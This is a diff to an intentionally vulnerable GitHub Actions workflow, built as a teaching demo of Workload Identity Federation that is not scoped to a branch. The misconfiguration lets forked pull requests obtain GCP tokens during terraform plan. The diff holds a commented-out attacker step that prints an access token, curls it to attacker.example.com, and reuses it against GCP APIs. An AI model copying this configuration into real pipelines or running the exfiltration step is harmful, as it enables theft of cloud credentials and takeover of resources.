@@ -1,12 +1,8 @@
-# =============================================================================
-# VULNERABLE — INTENTIONAL MISCONFIGURATION FOR EDUCATIONAL USE ONLY
-# =============================================================================
-# This workflow is INTENTIONALLY VULNERABLE for educational purposes.
+# ⚠️ INTENTIONALLY VULNERABLE — educational demo only
 # Trigger: pull_request (including from forks)
-# Problem: WIF subject is not scoped to refs/heads/main,
-#          so a forked PR can obtain a GCP access token during `terraform plan`.
-# The malicious step below simulates token exfiltration.
-# =============================================================================
+# Vulnerability: WIF subject is scoped only to repo name, not branch.
+# Any fork can open a PR, trigger terraform plan, and receive a valid GCP token.
+# The token can then be used to call GCP APIs with cicd-sa permissions.
 name: vulnerable-tf-plan
 
 on:
@@ -22,33 +18,33 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      # TODO: set workload_identity_provider and service_account to your values
-      - name: Authenticate to Google Cloud (WIF — NOT scoped to main ref)
+      - name: Authenticate to Google Cloud
         uses: google-github-actions/auth@v2
         with:
-          workload_identity_provider: ${{ secrets.WIF_PROVIDER }} # projects/.../locations/.../workloadIdentityPools/.../providers/...
-          service_account: ${{ secrets.WIF_SERVICE_ACCOUNT }} # cicd-sa@PROJECT_ID.iam.gserviceaccount.com
-          # VULNERABLE: missing attribute_condition — any ref (including fork PR merge refs) may authenticate
+          workload_identity_provider: ${{ secrets.WIF_PROVIDER }}
+          service_account: ${{ secrets.CICD_SA_EMAIL }}
 
       - name: Setup Terraform
         uses: hashicorp/setup-terraform@v3
 
       - name: Terraform Init
         working-directory: terraform
-        run: terraform init
+        env:
+          TF_STATE_BUCKET: ${{ secrets.TF_STATE_BUCKET }}
+        run: |
+          terraform init \
+            -backend-config="bucket=${TF_STATE_BUCKET}" \
+            -backend-config="prefix=terraform/state"
 
       - name: Terraform Plan
         working-directory: terraform
         run: terraform plan -input=false
 
-      # -----------------------------------------------------------------------
-      # Attacker payload (DO NOT ENABLE — illustration only):
-      # A forked PR could add a step that exfiltrates the OIDC-derived token:
-      #
-      # - name: Exfiltrate (example — commented out)
+      # ATTACKER STEP — what a malicious fork would add:
+      # - name: Exfiltrate token
       #   run: |
-      #     TOKEN="$(gcloud auth print-access-token --quiet)"
-      #     curl -sS -X POST "https://attacker.example/collect" \
-      #       -H "Content-Type: application/json" \
-      #       -d "{\"token\":\"$TOKEN\"}"
-      # -----------------------------------------------------------------------
+      #     TOKEN=$(gcloud auth print-access-token)
+      #     curl -X POST https://attacker.example.com/collect -d "token=$TOKEN"
+      #     # Now use token to modify GCP resource:
+      #     curl -H "Authorization: Bearer $TOKEN" \
+      #       https://compute.googleapis.com/compute/v1/projects/$PROJECT/...
